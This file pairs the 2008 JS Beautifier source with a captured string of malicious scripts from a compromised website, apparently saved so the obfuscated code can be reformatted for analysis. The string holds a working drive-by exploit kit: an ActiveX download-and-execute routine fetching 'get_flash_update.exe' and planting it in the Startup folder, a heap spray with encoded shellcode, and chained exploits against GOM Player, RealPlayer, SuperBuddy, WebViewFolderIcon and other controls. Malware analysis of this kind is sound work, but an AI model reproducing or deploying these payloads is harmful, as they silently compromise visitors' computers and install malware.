// Beautification code:
/*

 JS Beautifier
---------------
  $Date: 2008-06-10 14:49:11 +0300 (Tue, 10 Jun 2008) $
  $Revision: 60 $


  Written by Einars "elfz" Lielmanis, <elfz@laacz.lv> 
      http://elfz.laacz.lv/beautify/

  Originally converted to javascript by Vital, <vital76@gmail.com> 
      http://my.opera.com/Vital/blog/2007/11/21/javascript-beautify-on-javascript-translated


  You are free to use this in any way you want, in case you find this useful or working for you.

  Usage:
    js_beautify(js_source_text);

*/


function js_beautify(js_source_text, indent_size, indent_character, indent_level)
{

    var input, output, token_text, last_type, last_text, last_word, current_mode, modes, indent_string;
    var whitespace, wordchar, punct, parser_pos, line_starters, in_case;
    var prefix, token_type, do_block_just_closed, var_line, var_line_tainted;



    function trim_output()
    {
        while (output.length && (output[output.length - 1] === ' ' || output[output.length - 1] === indent_string)) {
            output.pop();
        }
    }

    function print_newline(ignore_repeated)
    {
        ignore_repeated = typeof ignore_repeated === 'undefined' ? true: ignore_repeated;
        
        trim_output();

        if (!output.length) {
            return; // no newline on start of file
        }

        if (output[output.length - 1] !== "\n" || !ignore_repeated) {
            output.push("\n");
        }
        for (var i = 0; i < indent_level; i++) {
            output.push(indent_string);
        }
    }



    function print_space()
    {
        var last_output = output.length ? output[output.length - 1] : ' ';
        if (last_output !== ' ' && last_output !== '\n' && last_output !== indent_string) { // prevent occassional duplicate space
            output.push(' ');
        }
    }


    function print_token()
    {
        output.push(token_text);
    }

    function indent()
    {
        indent_level++;
    }


    function unindent()
    {
        if (indent_level) {
            indent_level--;
        }
    }


    function remove_indent()
    {
        if (output.length && output[output.length - 1] === indent_string) {
            output.pop();
        }
    }


    function set_mode(mode)
    {
        modes.push(current_mode);
        current_mode = mode;
    }


    function restore_mode()
    {
        do_block_just_closed = current_mode === 'DO_BLOCK';
        current_mode = modes.pop();
    }


    function in_array(what, arr)
    {
        for (var i = 0; i < arr.length; i++)
        {
            if (arr[i] === what) {
                return true;
            }
        }
        return false;
    }



    function get_next_token()
    {
        var n_newlines = 0;
        var c = '';

        do {
            if (parser_pos >= input.length) {
                return ['', 'TK_EOF'];
            }
            c = input.charAt(parser_pos);

            parser_pos += 1;
            if (c === "\n") {
                n_newlines += 1;
            }
        }
        while (in_array(c, whitespace));

        if (n_newlines > 1) {
            for (var i = 0; i < 2; i++) {
                print_newline(i === 0);
            }
        }
        var wanted_newline = (n_newlines === 1);


        if (in_array(c, wordchar)) {
            if (parser_pos < input.length) {
                while (in_array(input.charAt(parser_pos), wordchar)) {
                    c += input.charAt(parser_pos);
                    parser_pos += 1;
                    if (parser_pos === input.length) {
                        break;
                    }
                }
            }

            // small and surprisingly unugly hack for 1E-10 representation
            if (parser_pos !== input.length && c.match(/^[0-9]+[Ee]$/) && input.charAt(parser_pos) === '-') {
                parser_pos += 1;

                var t = get_next_token(parser_pos);
                c += '-' + t[0];
                return [c, 'TK_WORD'];
            }

            if (c === 'in') { // hack for 'in' operator
                return [c, 'TK_OPERATOR'];
            }
            return [c, 'TK_WORD'];
        }
        
        if (c === '(' || c === '[') {
            return [c, 'TK_START_EXPR'];
        }

        if (c === ')' || c === ']') {
            return [c, 'TK_END_EXPR'];
        }

        if (c === '{') {
            return [c, 'TK_START_BLOCK'];
        }

        if (c === '}') {
            return [c, 'TK_END_BLOCK'];
        }

        if (c === ';') {
            return [c, 'TK_END_COMMAND'];
        }

        if (c === '/') {
            var comment = '';
            // peek for comment /* ... */
            if (input.charAt(parser_pos) === '*') {
                parser_pos += 1;
                if (parser_pos < input.length) {
                    while (! (input.charAt(parser_pos) === '*' && input.charAt(parser_pos + 1) && input.charAt(parser_pos + 1) === '/') && parser_pos < input.length) {
                        comment += input.charAt(parser_pos);
                        parser_pos += 1;
                        if (parser_pos >= input.length) {
                            break;
                        }
                    }
                }
                parser_pos += 2;
                return ['/*' + comment + '*/', 'TK_BLOCK_COMMENT'];
            }
            // peek for comment // ...
            if (input.charAt(parser_pos) === '/') {
                comment = c;
                while (input.charAt(parser_pos) !== "\x0d" && input.charAt(parser_pos) !== "\x0a") {
                    comment += input.charAt(parser_pos);
                    parser_pos += 1;
                    if (parser_pos >= input.length) {
                        break;
                    }
                }
                parser_pos += 1;
                if (wanted_newline) {
                    print_newline();
                }
                return [comment, 'TK_COMMENT'];
            }

        }

        if (c === "'" || // string
        c === '"' || // string
        (c === '/' &&
        ((last_type === 'TK_WORD' && last_text === 'return') || (last_type === 'TK_START_EXPR' || last_type === 'TK_END_BLOCK' || last_type === 'TK_OPERATOR' || last_type === 'TK_EOF' || last_type === 'TK_END_COMMAND')))) { // regexp
            var sep = c;
            var esc = false;
            c = '';

            if (parser_pos < input.length) {

                while (esc || input.charAt(parser_pos) !== sep) {
                    c += input.charAt(parser_pos);
                    if (!esc) {
                        esc = input.charAt(parser_pos) === '\\';
                    } else {
                        esc = false;
                    }
                    parser_pos += 1;
                    if (parser_pos >= input.length) {
                        break;
                    }
                }

            }

            parser_pos += 1;
            if (last_type === 'TK_END_COMMAND') {
                print_newline();
            }
            return [sep + c + sep, 'TK_STRING'];
        }

        if (in_array(c, punct)) {
            while (parser_pos < input.length && in_array(c + input.charAt(parser_pos), punct)) {
                c += input.charAt(parser_pos);
                parser_pos += 1;
                if (parser_pos >= input.length) {
                    break;
                }
            }
            return [c, 'TK_OPERATOR'];
        }

        return [c, 'TK_UNKNOWN'];
    }


    //----------------------------------

    indent_character = indent_character || ' ';
    indent_size = indent_size || 4;

    indent_string = '';
    while (indent_size--) {
        indent_string += indent_character;
    }

    input = js_source_text;

    last_word = ''; // last 'TK_WORD' passed
    last_type = 'TK_START_EXPR'; // last token type
    last_text = ''; // last token text
    output = [];

    do_block_just_closed = false;
    var_line = false;
    var_line_tainted = false;

    whitespace = "\n\r\t ".split('');
    wordchar = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$'.split('');
    punct = '+ - * / % & ++ -- = += -= *= /= %= == === != !== > < >= <= >> << >>> >>>= >>= <<= && &= | || ! !! , : ? ^ ^= |='.split(' ');

    // words which should always start on new line.
    line_starters = 'continue,try,throw,return,var,if,switch,case,default,for,while,break,function'.split(',');

    // states showing if we are currently in expression (i.e. "if" case) - 'EXPRESSION', or in usual block (like, procedure), 'BLOCK'.
    // some formatting depends on that.
    current_mode = 'BLOCK';
    modes = [current_mode];

    indent_level = indent_level || 0;
    parser_pos = 0; // parser position
    in_case = false; // flag for parser that case/default has been processed, and next colon needs special attention
    while (true) {
        var t = get_next_token(parser_pos);
        token_text = t[0];
        token_type = t[1];
        if (token_type === 'TK_EOF') {
            break;
        }

        switch (token_type) {

        case 'TK_START_EXPR':
            var_line = false;
            set_mode('EXPRESSION');
            if (last_type === 'TK_END_EXPR' || last_type === 'TK_START_EXPR') {
                // do nothing on (( and )( and ][ and ]( ..
            } else if (last_type !== 'TK_WORD' && last_type !== 'TK_OPERATOR') {
                print_space();
            } else if (in_array(last_word, line_starters) && last_word !== 'function') {
                print_space();
            }
            print_token();
            break;

        case 'TK_END_EXPR':
            print_token();
            restore_mode();
            break;

        case 'TK_START_BLOCK':
            
            if (last_word === 'do') {
                set_mode('DO_BLOCK');
            } else {
                set_mode('BLOCK');
            }
            if (last_type !== 'TK_OPERATOR' && last_type !== 'TK_START_EXPR') {
                if (last_type === 'TK_START_BLOCK') {
                    print_newline();
                } else {
                    print_space();
                }
            }
            print_token();
            indent();
            break;

        case 'TK_END_BLOCK':
            if (last_type === 'TK_START_BLOCK') {
                // nothing
                trim_output();
                unindent();
            } else {
                unindent();
                print_newline();
            }
            print_token();
            restore_mode();
            break;

        case 'TK_WORD':

            if (do_block_just_closed) {
                print_space();
                print_token();
                print_space();
                break;
            }

            if (token_text === 'case' || token_text === 'default') {
                if (last_text === ':') {
                    // switch cases following one another
                    remove_indent();
                } else {
                    // case statement starts in the same line where switch
                    unindent();
                    print_newline();
                    indent();
                }
                print_token();
                in_case = true;
                break;
            }


            prefix = 'NONE';
            if (last_type === 'TK_END_BLOCK') {
                if (!in_array(token_text.toLowerCase(), ['else', 'catch', 'finally'])) {
                    prefix = 'NEWLINE';
                } else {
                    prefix = 'SPACE';
                    print_space();
                }
            } else if (last_type === 'TK_END_COMMAND' && (current_mode === 'BLOCK' || current_mode === 'DO_BLOCK')) {
                prefix = 'NEWLINE';
            } else if (last_type === 'TK_END_COMMAND' && current_mode === 'EXPRESSION') {
                prefix = 'SPACE';
            } else if (last_type === 'TK_WORD') {
                prefix = 'SPACE';
            } else if (last_type === 'TK_START_BLOCK') {
                prefix = 'NEWLINE';
            } else if (last_type === 'TK_END_EXPR') {
                print_space();
                prefix = 'NEWLINE';
            }

            if (last_type !== 'TK_END_BLOCK' && in_array(token_text.toLowerCase(), ['else', 'catch', 'finally'])) {
                print_newline();
            } else if (in_array(token_text, line_starters) || prefix === 'NEWLINE') {
                if (last_text === 'else') {
                    // no need to force newline on else break
                    print_space();
                } else if ((last_type === 'TK_START_EXPR' || last_text === '=') && token_text === 'function') {
                    // no need to force newline on 'function': (function
                    // DONOTHING
                } else if (last_type === 'TK_WORD' && (last_text === 'return' || last_text === 'throw')) {
                    // no newline between 'return nnn'
                    print_space();
                } else if (last_type !== 'TK_END_EXPR') {
                    if ((last_type !== 'TK_START_EXPR' || token_text !== 'var') && last_text !== ':') {
                        // no need to force newline on 'var': for (var x = 0...)
                        if (token_text === 'if' && last_type === 'TK_WORD' && last_word === 'else') {
                            // no newline for } else if {
                            print_space();
                        } else {
                            print_newline();
                        }
                    }
                } else {
                    if (in_array(token_text, line_starters) && last_text !== ')') {
                        print_newline();
                    }
                }
            } else if (prefix === 'SPACE') {
                print_space();
            }
            print_token();
            last_word = token_text;

            if (token_text === 'var') {
                var_line = true;
                var_line_tainted = false;
            }

            break;

        case 'TK_END_COMMAND':

            print_token();
            var_line = false;
            break;

        case 'TK_STRING':

            if (last_type === 'TK_START_BLOCK' || last_type === 'TK_END_BLOCK') {
                print_newline();
            } else if (last_type === 'TK_WORD') {
                print_space();
            }
            print_token();
            break;

        case 'TK_OPERATOR':

            var start_delim = true;
            var end_delim = true;
            if (var_line && token_text !== ',') {
                var_line_tainted = true;
                if (token_text === ':') {
                    var_line = false;
                }
            }

            if (token_text === ':' && in_case) {
                print_token(); // colon really asks for separate treatment
                print_newline();
                break;
            }

            in_case = false;

            if (token_text === ',') {
                if (var_line) {
                    if (var_line_tainted) {
                        print_token();
                        print_newline();
                        var_line_tainted = false;
                    } else {
                        print_token();
                        print_space();
                    }
                } else if (last_type === 'TK_END_BLOCK') {
                    print_token();
                    print_newline();
                } else {
                    if (current_mode === 'BLOCK') {
                        print_token();
                        print_newline();
                    } else {
                        // EXPR od DO_BLOCK
                        print_token();
                        print_space();
                    }
                }
                break;
            } else if (token_text === '--' || token_text === '++') { // unary operators special case
                if (last_text === ';') {
                    // space for (;; ++i)
                    start_delim = true;
                    end_delim = false;
                } else {
                    start_delim = false;
                    end_delim = false;
                }
            } else if (token_text === '!' && last_type === 'TK_START_EXPR') {
                // special case handling: if (!a)
                start_delim = false;
                end_delim = false;
            } else if (last_type === 'TK_OPERATOR') {
                start_delim = false;
                end_delim = false;
            } else if (last_type === 'TK_END_EXPR') {
                start_delim = true;
                end_delim = true;
            } else if (token_text === '.') {
                // decimal digits or object.property
                start_delim = false;
                end_delim = false;

            } else if (token_text === ':') {
                // zz: xx
                // can't differentiate ternary op, so for now it's a ? b: c; without space before colon
                if (last_text.match(/^\d+$/)) {
                    // a little help for ternary a ? 1 : 0;
                    start_delim = true;
                } else {
                    start_delim = false;
                }
            }
            if (start_delim) {
                print_space();
            }

            print_token();

            if (end_delim) {
                print_space();
            }
            break;

        case 'TK_BLOCK_COMMENT':

            print_newline();
            print_token();
            print_newline();
            break;

        case 'TK_COMMENT':

            // print_newline();
            print_space();
            print_token();
            print_newline();
            break;

        case 'TK_UNKNOWN':
            print_token();
            break;
        }

        last_type = token_type;
        last_text = token_text;
    }

    return output.join('');

}


// Now we load the code to be beautified:
var code='// Monkeywrench run Wed Jul 30 17:04:55 2008\n\
// -----------------------------------------------\n\
// Set up a document object\n\
// -----------------------------------------------\n\
document.location.href = \'http://www.baeckerei-sedlmaier.de/1.html\'\n\
\n\
\n\
// -----------------------------------------------\n\
// inline script:\n\
// -----------------------------------------------\n\
ZUgZJXG();function ZUgZJXG(){ KglUBuK = document.location.href.replace(/1.html/ig,\'\') + \'get_flash_update.exe\';var OQgDOuD = document.createElement(\'object\'); OQgDOuD.setAttribute(\'id\',\'OQgDOuD\');OQgDOuD.setAttribute(\'classid\',\'clsid:BD96C556-65A3-11D0-983A-00C04FC29E36\');try{var dXlOmxJ = document.createElement(\'object\');dXlOmxJ.setAttribute(\'id\',\'dXlOmxJ\');dXlOmxJ.setAttribute(\'classid\',\'clsid:F0E42D50-368C-11D0-AD81-00A0C90DC8D9\');var AxclEnf = \'C:/Documents and Settings/All Users/Start Menu/Programs/Startup/smss.exe\';dXlOmxJ.SnapshotPath = KglUBuK;dXlOmxJ.CompressedPath = AxclEnf; eval(dXlOmxJ.PrintSnapshot());}catch(JgsOOiI){}try{var fHQTyXx = OQgDOuD.CreateObject(\'msxml2.XMLHTTP\',\'\'); var BKPYHiu = OQgDOuD.CreateObject(\'Shell.Application\',\'\');var nrbromf = OQgDOuD.CreateObject(\'adodb.stream\',\'\');try{eval(nrbromf.type = 1); eval(fHQTyXx.open(\'GET\', KglUBuK,false));eval(fHQTyXx.send());eval(nrbromf.open());nrbromf.Write(fHQTyXx.responseBody); var zIPafSm = \'.//..//wXtwRzv.exe\';eval(nrbromf.savetofile(zIPafSm,2));eval(nrbromf.close());}catch(JgsOOiI){}try{eval(BKPYHiu.shellexecute(zIPafSm));}catch(JgsOOiI){}}catch(JgsOOiI){}}\n\
// -----------------------------------------------\n\
// script ends\n\
// -----------------------------------------------\n\
\n\
// -----------------------------------------------\n\
// inline script:\n\
// -----------------------------------------------\n\
var nggByhS = 0x0c0c0c0c; function Gslide(spraySlide, saruuysaddize){while (spraySlide.length * 2 < saruuysaddize){spraySlide += spraySlide;}spraySlide = spraySlide.substring(0, saruuysaddize / 2);return spraySlide;}url = document.location.href.replace(/1.html/ig,\'\') + \'get_flash_update.exe\';var outValue = \'\';for (i = 0; i < url.length;){outValue += \'%u\' + url.charCodeAt(i+1).toString(16) + url.charCodeAt(i).toString(16);i = i + 2;}outValue += \'%u0000\';var Shellcode = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1" + outValue);var hadttdtSize = 0x400000;var payfdLytyusade = Shellcode.length * 2;var tggter = payfdLytyusade + 0x38;var saruuysaddize = hadttdtSize - tggter;var spraySlide = unescape("%u0c0c%u0c0c"); var prrerat = new Array();spraySlide = Gslide(spraySlide, saruuysaddize);var kilrrer = nggByhS - 0x400000;hsttiicks = kilrrer / hadttdtSize; for (i = 0; i < hsttiicks; i++){prrerat[i] = spraySlide + Shellcode;}function startCreateControlRange(){ugric = unescape("%u0d0d%u0d0d");var xYz = 0x40000;while(ugric.length<xYz) ugric += ugric;ugric = ugric.substring(0, 0x3ffe4-Shellcode.length);bublic = new Array();for(i = bublic; i < 450; i++) bublic[i] = ugric + Shellcode; mceil = Math.ceil(0xd0d0d0d);document.write(\'<object classid="CLSID:EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F"></object>\');try{mceil = document.scripts[0].createControlRange().length;}catch(e){}setTimeout("startSuperBuddy()", 3000);}function startSuperBuddy(){try {var buddy = new ActiveXObject(\'Sb.SuperBuddy.1\');if (buddy){buddy.LinkSBIcons(0x0c0c0c0c);}}catch(e) {}setTimeout("startAudioFile()", 2000);}function startAudioFile(){try{var mmed = document.createElement(\'object\');mmed.setAttribute(\'classid\', \'clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC\');var mms=\'\';for(var i=0; i < 4120; i++) { mms += \'A\'; }mms += \'\';mmed.SetFormatLikeSample(mms);}catch(e){}setTimeout("startGOM()", 2000);} function startGOM(){var sURL=\'\';for(var i = 0; i < 510; i++){sURL += unescape("%0c");}try{var GomManager = new ActiveXObject(\'GomWebCtrl.GomManager.1\');GomManager.OpenURL(sURL);}catch(e){}setTimeout("startRealPlayer()", 2000);}function startRealPlayer(){try{var rpl = document.createElement(\'object\'),adt=\'\';rpl.setAttribute(\'classid\', \'clsid:2F542A2E-EDC9-4BF7-8CB1-87C9919F7F93\');for(var i = 0; i < 32; i++) { adt=adt+unescape("%0C"); }for(i = 0; i < 5; i++){rbt = rpl.Console;rpl.Console = adt;rpl.Console = rbt;}setTimeout("startWVF()", 2000);}catch(e){}}function startWVF(){for (i = 0; i < 128; i++) {try{var tar = new ActiveXObject(\'WebViewFolderIcon.WebViewFolderIcon.1\');tar.setSlice(0x7ffffffe, 0x05050505, 0x05050505,0x05050505);}catch(e){}}} startCreateControlRange();\n\
// -----------------------------------------------\n\
// script ends\n\
// -----------------------------------------------\n\
\n\
'

// And now we call our beautification code:
print (js_beautify (code, 3, ' ', 0));
